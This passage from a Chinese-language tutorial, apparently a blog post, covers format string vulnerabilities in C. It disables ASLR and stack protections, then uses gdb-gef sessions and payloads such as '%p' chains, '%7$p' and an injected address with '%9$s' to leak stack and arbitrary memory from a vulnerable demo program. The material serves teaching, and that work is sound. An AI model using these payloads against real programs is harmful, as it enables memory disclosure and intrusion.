<span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, format);</span><br><span class="line">    <span class="built_in">printf</span>(format, arg1, arg2, arg3, arg4);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>做实验首先要注意<br>1.关闭ASLR，linux下ASLR是自动开启的，不关闭的话栈地址每次都是随机的（可能要管理员权限）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># </span><span class="language-bash"><span class="built_in">echo</span> 0 &gt; /proc/sys/kernel/randomize_va_space</span></span><br></pre></td></tr></table></figure><p>2.编译时关闭CANARY,PIE。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$ </span><span class="language-bash">gcc -fno-stack-protector -no-pie fmtdemo.c -o fmtdemo -g</span></span><br></pre></td></tr></table></figure><p>3.进行调试（下面的调用可能在您的电脑上不一样）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$ </span><span class="language-bash">gdb-gef fmtdemo</span></span><br><span class="line">gef➤  b printf</span><br><span class="line">gef➤  r</span><br><span class="line"><span class="meta">%</span><span class="language-bash">p.%p.%p.%p.%p.%p.%p.%p.%p.%p</span></span><br><span class="line"></span><br><span class="line">[ Legend: Modified register | Code | Heap | Stack | String ]</span><br><span class="line">───────────────────────────────────────────────────────────────── registers ────</span><br><span class="line"><span class="meta">$</span><span class="language-bash">rax   : 0x0</span>               </span><br><span class="line"><span class="meta">$</span><span class="language-bash">rbx   : 0x0000000000401210  →  &lt;__libc_csu_init+0&gt; endbr64</span> </span><br><span class="line"><span class="meta">$</span><span class="language-bash">rcx   : 0xffffffff</span>        </span><br><span class="line"><span class="meta">$</span><span class="language-bash">rdx   : 0x88888888</span>        </span><br><span class="line"><span class="meta">$</span><span class="language-bash">rsp   : 0x00007fffffffdec8  →  0x00000000004011f6  →  &lt;main+128&gt; mov edi, 0xa</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">rbp   : 0x00007fffffffdf70  →  0x0000000000000000</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">rsi   : 0x1</span>               </span><br><span class="line"><span class="meta">$</span><span class="language-bash">rdi   : 0x00007fffffffdee0  →  <span class="string">&quot;%p.%p.%p.%p.%p.%p.%p.%p.%p.%p&quot;</span></span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">rip   : 0x00007ffff7e17c90  →  &lt;<span class="built_in">printf</span>+0&gt; endbr64</span> </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r8    : 0x00007fffffffded6  →  <span class="string">&quot;ABCDEFGH&quot;</span></span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">r9    : 0x7c</span>              </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r10   : 0x00007ffff7fef8c0  →   pxor xmm0, xmm0</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">r11   : 0x00007ffff7e17c90  →  &lt;<span class="built_in">printf</span>+0&gt; endbr64</span> </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r12   : 0x0000000000401090  →  &lt;_start+0&gt; endbr64</span> </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r13   : 0x00007fffffffe060  →  0x0000000000000001</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">r14   : 0x0</span>               </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r15   : 0x0</span>               </span><br><span class="line"><span class="meta">$</span><span class="language-bash">eflags: [zero carry parity adjust sign <span class="built_in">trap</span> INTERRUPT direction overflow resume virtualx86 identification]</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">cs: 0x33 <span class="variable">$ss</span>: 0x2b <span class="variable">$ds</span>: 0x00 <span class="variable">$es</span>: 0x00 <span class="variable">$fs</span>: 0x00 <span class="variable">$gs</span>: 0x00</span> </span><br><span class="line">───────────────────────────────────────────────────────────────────── stack ────</span><br><span class="line">0x00007fffffffdec8│+0x0000: 0x00000000004011f6  →  &lt;main+128&gt; mov edi, 0xa ← $rsp</span><br><span class="line">0x00007fffffffded0│+0x0008: 0x4241000000000000</span><br><span class="line">0x00007fffffffded8│+0x0010: 0x0000484746454443 (&quot;CDEFGH&quot;?)</span><br><span class="line">0x00007fffffffdee0│+0x0018: &quot;%p.%p.%p.%p.%p.%p.%p.%p.%p.%p&quot; ← $rdi</span><br><span class="line">0x00007fffffffdee8│+0x0020: &quot;.%p.%p.%p.%p.%p.%p.%p&quot;</span><br><span class="line">0x00007fffffffdef0│+0x0028: &quot;p.%p.%p.%p.%p&quot;</span><br><span class="line">0x00007fffffffdef8│+0x0030: 0x00000070252e7025 (&quot;%p.%p&quot;?)</span><br><span class="line">0x00007fffffffdf00│+0x0038: 0x0000000000000000</span><br><span class="line">─────────────────────────────────────────────────────────────── code:x86:64 ────</span><br><span class="line">   0x7ffff7e17c81 &lt;fprintf+177&gt;    ret    </span><br><span class="line">   0x7ffff7e17c82 &lt;fprintf+178&gt;    call   0x7ffff7ee5a70 &lt;__stack_chk_fail&gt;</span><br><span class="line">   0x7ffff7e17c87                  nop    WORD PTR [rax+rax*1+0x0]</span><br><span class="line"> → 0x7ffff7e17c90 &lt;printf+0&gt;       endbr64 </span><br><span class="line">   0x7ffff7e17c94 &lt;printf+4&gt;       sub    rsp, 0xd8</span><br><span class="line">   0x7ffff7e17c9b &lt;printf+11&gt;      mov    r10, rdi</span><br><span class="line">   0x7ffff7e17c9e &lt;printf+14&gt;      mov    QWORD PTR [rsp+0x28], rsi</span><br><span class="line">   0x7ffff7e17ca3 &lt;printf+19&gt;      mov    QWORD PTR [rsp+0x30], rdx</span><br><span class="line">   0x7ffff7e17ca8 &lt;printf+24&gt;      mov    QWORD PTR [rsp+0x38], rcx</span><br><span class="line">─────────────────────────────────────────────────────────────────── threads ────</span><br><span class="line"><span class="meta">[#</span><span class="language-bash">0] Id 1, Name: <span class="string">&quot;fmtdemo&quot;</span>, stopped 0x7ffff7e17c90 <span class="keyword">in</span> <span class="built_in">printf</span> (), reason: BREAKPOINT</span></span><br><span class="line">───────────────────────────────────────────────────────────────────── trace ────</span><br><span class="line"><span class="meta">[#</span><span class="language-bash">0] 0x7ffff7e17c90 → <span class="built_in">printf</span>()</span></span><br><span class="line"><span class="meta">[#</span><span class="language-bash">1] 0x4011f6 → main()</span></span><br><span class="line">────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">gef➤  x/32x $rsp</span><br><span class="line">0x7fffffffdec8:0x004011f60x000000000x000000000x42410000</span><br><span class="line">0x7fffffffded8:0x464544430x000048470x252e70250x70252e70</span><br><span class="line">0x7fffffffdee8:0x2e70252e0x252e70250x70252e700x2e70252e</span><br><span class="line">0x7fffffffdef8:0x252e70250x000000700x000000000x00000000</span><br><span class="line">0x7fffffffdf08:0x000000000x000000000x004000400x00000000</span><br><span class="line">0x7fffffffdf18:0x00f0b5ff0x000000000x000000c20x00000000</span><br><span class="line">0x7fffffffdf28:0xffffdf570x00007fff0xffffdf560x00007fff</span><br><span class="line">0x7fffffffdf38:0x0040125d0x000000000xf7fa72e80x00007fff</span><br><span class="line">gef➤  c</span><br><span class="line">Continuing.</span><br><span class="line">0x1.0x88888888.0xffffffff.0x7fffffffded6.0x7c.0x4241000000000000.0x484746454443.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70</span><br><span class="line">[Inferior 1 (process 19160) exited with code 012]</span><br><span class="line">gef➤  </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>传入参数后，相当于执行：</p><p><code>printf(%p.%p.%p.%p.%p.%p.%p.%p.%p.%p, 1, 88888888，-1, ABCDEFGH);</code></p><p>格式字符串 <code>%p</code> 表示函数 <code>printf()</code> 从参数调用流中取出参数并将它们指针的形式显示出来。它将首先输出除 rdi 外的 5 个寄存器中的内容（因为 rdi 负责传递字符串），然后继续输出栈的内容。</p><p>格式化输出函数使用一个内部变量来标志下一个参数的位置。 开始时，参数指针指向第一个参数 arg1 随着每一个参数被相应的格式规范使用， 参数指针也根据参数的长度不断递增。在打印完当前函数的剩余参数之后，printf() 就会打印当前函数的栈帧（ 包括返回地址和参数等 )。</p><hr><p>上面的方法都是依次获得栈中的参数，如果我们想要<strong>直接获得被指定的某个参数</strong>，则可以使用类似下面的格式字符串：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">%&lt;arg#&gt;$&lt;format&gt;</span><br><span class="line"></span><br><span class="line">%n$p</span><br></pre></td></tr></table></figure><p>这里的 <code>n</code> 表示栈中格式字符串后面的第 <code>n</code> 个值。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$ </span><span class="language-bash">./fmtdemo</span> </span><br><span class="line"><span class="meta">%</span><span class="language-bash">7<span class="variable">$p</span>.%8<span class="variable">$p</span>.%9<span class="variable">$p</span></span></span><br><span class="line">0x484746454443.0x2438252e70243725.0x702439252e70</span><br><span class="line"><span class="meta">$ </span></span><br></pre></td></tr></table></figure><p>我们通过 <code>%7$p</code> 获取了 <code>arg4</code> 在栈上的内容。可以看到这种方法非常强大，可以获得栈中任意的值。</p><h4 id="223-任意地址内存泄漏"><a class="markdownIt-Anchor" href="#223-任意地址内存泄漏"></a> 2.2.3 任意地址内存泄漏</h4><p>攻击者使用类似**“％S”的格式规范就可以泄露出参数（ 指针） 所指向内存的数据**， 程序会将它作为一个 ASCII 字符串处理， 直到遇到一个空字符。所以， 如果攻击者能够操纵这个参数的值， 那么就可以泄露任意地址的内容。</p><p>还是上面的程序，我们输入 <code>%4$s</code>，输出的 <code>arg4</code> 就变成了 <code>ABCD</code> 而不是地址 <code>0x7fffffffded6</code>：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$ </span><span class="language-bash">./fmtdemo</span></span><br><span class="line"><span class="meta">%</span><span class="language-bash">4<span class="variable">$s</span></span></span><br><span class="line">ABCDEFGH</span><br><span class="line"><span class="meta">$ </span></span><br></pre></td></tr></table></figure><p>上面的例子只能读取栈中已有的内容，如果我们想获取的是任意的地址的内容，就需要我们自己将地址写入到栈中。我们输入 <code>AAAA.%p</code> 这样的格式的字符串，观察一下栈有什么变化。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$ </span><span class="language-bash">python -c <span class="string">&#x27;print(&quot;AAAAAAAA&quot;+&quot;.%p&quot;*20)&#x27;</span></span></span><br><span class="line">AAAAAAAA.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p</span><br><span class="line"></span><br><span class="line">gef➤  b printf</span><br><span class="line">Breakpoint 1 at 0x401070</span><br><span class="line">gef➤  r</span><br><span class="line">AAAAAAAA.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p</span><br><span class="line"></span><br><span class="line">[ Legend: Modified register | Code | Heap | Stack | String ]</span><br><span class="line">───────────────────────────────────────────────────────────────── registers ────</span><br><span class="line"><span class="meta">$</span><span class="language-bash">rax   : 0x0</span>               </span><br><span class="line"><span class="meta">$</span><span class="language-bash">rbx   : 0x0000000000401210  →  &lt;__libc_csu_init+0&gt; endbr64</span> </span><br><span class="line"><span class="meta">$</span><span class="language-bash">rcx   : 0xffffffff</span>        </span><br><span class="line"><span class="meta">$</span><span class="language-bash">rdx   : 0x88888888</span>        </span><br><span class="line"><span class="meta">$</span><span class="language-bash">rsp   : 0x00007fffffffdec8  →  0x00000000004011f6  →  &lt;main+128&gt; mov edi, 0xa</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">rbp   : 0x00007fffffffdf70  →  0x0000000000000000</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">rsi   : 0x1</span>               </span><br><span class="line"><span class="meta">$</span><span class="language-bash">rdi   : 0x00007fffffffdee0  →  <span class="string">&quot;AAAAAAAA.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p[...]&quot;</span></span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">rip   : 0x00007ffff7e17c90  →  &lt;<span class="built_in">printf</span>+0&gt; endbr64</span> </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r8    : 0x00007fffffffded6  →  <span class="string">&quot;ABCDEFGH&quot;</span></span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">r9    : 0x7c</span>              </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r10   : 0x00007ffff7fef8c0  →   pxor xmm0, xmm0</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">r11   : 0x00007ffff7e17c90  →  &lt;<span class="built_in">printf</span>+0&gt; endbr64</span> </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r12   : 0x0000000000401090  →  &lt;_start+0&gt; endbr64</span> </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r13   : 0x00007fffffffe060  →  0x0000000000000001</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">r14   : 0x0</span>               </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r15   : 0x0</span>               </span><br><span class="line"><span class="meta">$</span><span class="language-bash">eflags: [zero carry parity adjust sign <span class="built_in">trap</span> INTERRUPT direction overflow resume virtualx86 identification]</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">cs: 0x33 <span class="variable">$ss</span>: 0x2b <span class="variable">$ds</span>: 0x00 <span class="variable">$es</span>: 0x00 <span class="variable">$fs</span>: 0x00 <span class="variable">$gs</span>: 0x00</span> </span><br><span class="line">───────────────────────────────────────────────────────────────────── stack ────</span><br><span class="line">0x00007fffffffdec8│+0x0000: 0x00000000004011f6  →  &lt;main+128&gt; mov edi, 0xa ← $rsp</span><br><span class="line">0x00007fffffffded0│+0x0008: 0x4241000000000000</span><br><span class="line">0x00007fffffffded8│+0x0010: 0x0000484746454443 (&quot;CDEFGH&quot;?)</span><br><span class="line">0x00007fffffffdee0│+0x0018: &quot;AAAAAAAA.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p[...]&quot; ← $rdi</span><br><span class="line">0x00007fffffffdee8│+0x0020: &quot;.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%[...]&quot;</span><br><span class="line">0x00007fffffffdef0│+0x0028: &quot;p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.[...]&quot;</span><br><span class="line">0x00007fffffffdef8│+0x0030: &quot;%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p&quot;</span><br><span class="line">0x00007fffffffdf00│+0x0038: &quot;.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p&quot;</span><br><span class="line">─────────────────────────────────────────────────────────────── code:x86:64 ────</span><br><span class="line">   0x7ffff7e17c81 &lt;fprintf+177&gt;    ret    </span><br><span class="line">   0x7ffff7e17c82 &lt;fprintf+178&gt;    call   0x7ffff7ee5a70 &lt;__stack_chk_fail&gt;</span><br><span class="line">   0x7ffff7e17c87                  nop    WORD PTR [rax+rax*1+0x0]</span><br><span class="line"> → 0x7ffff7e17c90 &lt;printf+0&gt;       endbr64 </span><br><span class="line">   0x7ffff7e17c94 &lt;printf+4&gt;       sub    rsp, 0xd8</span><br><span class="line">   0x7ffff7e17c9b &lt;printf+11&gt;      mov    r10, rdi</span><br><span class="line">   0x7ffff7e17c9e &lt;printf+14&gt;      mov    QWORD PTR [rsp+0x28], rsi</span><br><span class="line">   0x7ffff7e17ca3 &lt;printf+19&gt;      mov    QWORD PTR [rsp+0x30], rdx</span><br><span class="line">   0x7ffff7e17ca8 &lt;printf+24&gt;      mov    QWORD PTR [rsp+0x38], rcx</span><br><span class="line">─────────────────────────────────────────────────────────────────── threads ────</span><br><span class="line"><span class="meta">[#</span><span class="language-bash">0] Id 1, Name: <span class="string">&quot;fmtdemo&quot;</span>, stopped 0x7ffff7e17c90 <span class="keyword">in</span> <span class="built_in">printf</span> (), reason: BREAKPOINT</span></span><br><span class="line">───────────────────────────────────────────────────────────────────── trace ────</span><br><span class="line"><span class="meta">[#</span><span class="language-bash">0] 0x7ffff7e17c90 → <span class="built_in">printf</span>()</span></span><br><span class="line"><span class="meta">[#</span><span class="language-bash">1] 0x4011f6 → main()</span></span><br><span class="line">────────────────────────────────────────────────────────────────────────────────</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>格式字符串的地址在 <code>0x00007fffffffdee0</code>，从下面的输出中可以看到它们在栈中是怎样排布的：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">gef➤  x/20w $rsp</span><br><span class="line">0x7fffffffdec8:0x4011f60x00x00x42410000</span><br><span class="line">0x7fffffffded8:0x464544430x48470x414141410x41414141</span><br><span class="line">0x7fffffffdee8:0x2e70252e0x252e70250x70252e700x2e70252e</span><br><span class="line">0x7fffffffdef8:0x252e70250x70252e700x2e70252e0x252e7025</span><br><span class="line">0x7fffffffdf08:0x70252e700x2e70252e0x252e70250x70252e70</span><br><span class="line">gef➤  c</span><br><span class="line">Continuing.</span><br><span class="line">AAAAAAAA.0x1.0x88888888.0xffffffff.0x7fffffffded6.0x7c.0x4241000000000000.0x484746454443.0x4141414141414141.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x70252e70.0x7fffffffdf57.0x7fffffffdf56.0x40125d.0x7ffff7fa72e8</span><br><span class="line">[Inferior 1 (process 19619) exited with code 012]</span><br><span class="line">gef➤  </span><br></pre></td></tr></table></figure><p><code>0x4141414141414141</code> 是输出的第 9 个字符，所以我们使用 <code>%9$s</code> 即可读出 <code>0x4141414141414141</code> 处的内容，当然，这里可能是一个不合法的地址。下面我们把 <code>0x4141414141414141</code> 换成我们需要的合法的地址，比如字符串 <code>ABCDEFGH</code> 的地址 0x7fffffffded6：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$ </span><span class="language-bash">python2 -c <span class="string">&#x27;print(&quot;\xd6\xde\xff\xff\xff\x7f\x00\x00&quot;+&quot;.%9$s&quot;)&#x27;</span> &gt; text</span></span><br><span class="line"><span class="meta">$ </span><span class="language-bash">gdb-gef fmtdemo</span></span><br><span class="line"></span><br><span class="line">gef➤  b printf</span><br><span class="line">Breakpoint 1 at 0x401070</span><br><span class="line">gef➤  r &lt; text</span><br><span class="line">Starting program: /home/sakura/文档/print/fmtdemo &lt; text</span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0x00007ffff7e17c90 in printf () from /lib/x86_64-linux-gnu/libc.so.6</span><br><span class="line"></span><br><span class="line">[ Legend: Modified register | Code | Heap | Stack | String ]</span><br><span class="line">───────────────────────────────────────────────────────────────── registers ────</span><br><span class="line"><span class="meta">$</span><span class="language-bash">rax   : 0x0</span>               </span><br><span class="line"><span class="meta">$</span><span class="language-bash">rbx   : 0x0000000000401210  →  &lt;__libc_csu_init+0&gt; endbr64</span> </span><br><span class="line"><span class="meta">$</span><span class="language-bash">rcx   : 0xffffffff</span>        </span><br><span class="line"><span class="meta">$</span><span class="language-bash">rdx   : 0x88888888</span>        </span><br><span class="line"><span class="meta">$</span><span class="language-bash">rsp   : 0x00007fffffffdec8  →  0x00000000004011f6  →  &lt;main+128&gt; mov edi, 0xa</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">rbp   : 0x00007fffffffdf70  →  0x0000000000000000</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">rsi   : 0x1</span>               </span><br><span class="line"><span class="meta">$</span><span class="language-bash">rdi   : 0x00007fffffffdee0  →  0x00007fffffffded6  →  <span class="string">&quot;ABCDEFGH&quot;</span></span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">rip   : 0x00007ffff7e17c90  →  &lt;<span class="built_in">printf</span>+0&gt; endbr64</span> </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r8    : 0x00007fffffffded6  →  <span class="string">&quot;ABCDEFGH&quot;</span></span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">r9    : 0x7c</span>              </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r10   : 0x00007ffff7fef8c0  →   pxor xmm0, xmm0</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">r11   : 0x00007ffff7e17c90  →  &lt;<span class="built_in">printf</span>+0&gt; endbr64</span> </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r12   : 0x0000000000401090  →  &lt;_start+0&gt; endbr64</span> </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r13   : 0x00007fffffffe060  →  0x0000000000000001</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">r14   : 0x0</span>               </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r15   : 0x0</span>               </span><br><span class="line"><span class="meta">$</span><span class="language-bash">eflags: [zero carry parity adjust sign <span class="built_in">trap</span> INTERRUPT direction overflow resume virtualx86 identification]</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">cs: 0x33 <span class="variable">$ss</span>: 0x2b <span class="variable">$ds</span>: 0x00 <span class="variable">$es</span>: 0x00 <span class="variable">$fs</span>: 0x00 <span class="variable">$gs</span>: 0x00</span> </span><br><span class="line">───────────────────────────────────────────────────────────────────── stack ────</span><br><span class="line">0x00007fffffffdec8│+0x0000: 0x00000000004011f6  →  &lt;main+128&gt; mov edi, 0xa ← $rsp</span><br><span class="line">0x00007fffffffded0│+0x0008: 0x4241000000000000</span><br><span class="line">0x00007fffffffded8│+0x0010: 0x0000484746454443 (&quot;CDEFGH&quot;?)</span><br><span class="line">0x00007fffffffdee0│+0x0018: 0x00007fffffffded6  →  &quot;ABCDEFGH&quot; ← $rdi</span><br><span class="line">0x00007fffffffdee8│+0x0020: 0x000000732439252e (&quot;.%9$s&quot;?)</span><br><span class="line">0x00007fffffffdef0│+0x0028: 0x0000000000000000</span><br><span class="line">0x00007fffffffdef8│+0x0030: 0x0000000000000000</span><br><span class="line">0x00007fffffffdf00│+0x0038: 0x0000000000000000</span><br><span class="line">─────────────────────────────────────────────────────────────── code:x86:64 ────</span><br><span class="line">   0x7ffff7e17c81 &lt;fprintf+177&gt;    ret    </span><br><span class="line">   0x7ffff7e17c82 &lt;fprintf+178&gt;    call   0x7ffff7ee5a70 &lt;__stack_chk_fail&gt;</span><br><span class="line">   0x7ffff7e17c87                  nop    WORD PTR [rax+rax*1+0x0]</span><br><span class="line"> → 0x7ffff7e17c90 &lt;printf+0&gt;       endbr64 </span><br><span class="line">   0x7ffff7e17c94 &lt;printf+4&gt;       sub    rsp, 0xd8</span><br><span class="line">   0x7ffff7e17c9b &lt;printf+11&gt;      mov    r10, rdi</span><br><span class="line">   0x7ffff7e17c9e &lt;printf+14&gt;      mov    QWORD PTR [rsp+0x28], rsi</span><br><span class="line">   0x7ffff7e17ca3 &lt;printf+19&gt;      mov    QWORD PTR [rsp+0x30], rdx</span><br><span class="line">   0x7ffff7e17ca8 &lt;printf+24&gt;      mov    QWORD PTR [rsp+0x38], rcx</span><br><span class="line">─────────────────────────────────────────────────────────────────── threads ────</span><br><span class="line"><span class="meta">[#</span><span class="language-bash">0] Id 1, Name: <span class="string">&quot;fmtdemo&quot;</span>, stopped 0x7ffff7e17c90 <span class="keyword">in</span> <span class="built_in">printf</span> (), reason: BREAKPOINT</span></span><br><span class="line">───────────────────────────────────────────────────────────────────── trace ────</span><br><span class="line"><span class="meta">[#</span><span class="language-bash">0] 0x7ffff7e17c90 → <span class="built_in">printf</span>()</span></span><br><span class="line"><span class="meta">[#</span><span class="language-bash">1] 0x4011f6 → main()</span></span><br><span class="line">────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">gef➤  x/20g $rsp</span><br><span class="line">0x7fffffffdec8:0x4011f60x4241000000000000</span><br><span class="line">0x7fffffffded8:0x4847464544430x7fffffffded6</span><br><span class="line">0x7fffffffdee8:0x732439252e0x0</span><br><span class="line">0x7fffffffdef8:0x00x0</span><br><span class="line">0x7fffffffdf08:0x00x400040</span><br><span class="line">0x7fffffffdf18:0xf0b5ff0xc2</span><br><span class="line">0x7fffffffdf28:0x7fffffffdf570x7fffffffdf56</span><br><span class="line">0x7fffffffdf38:0x40125d0x7ffff7fa72e8</span><br><span class="line">0x7fffffffdf48:0x4012100x0</span><br><span class="line">0x7fffffffdf58:0x4010900xffffffffffffe060</span><br><span class="line">gef➤  x/s 0x00007fffffffded6</span><br><span class="line">0x7fffffffded6:&quot;ABCDEFGH&quot;</span><br><span class="line">gef➤  c</span><br><span class="line">Continuing.</span><br><span class="line">�����</span><br><span class="line">[Inferior 1 (process 21612) exited with code 012]</span><br><span class="line">gef➤  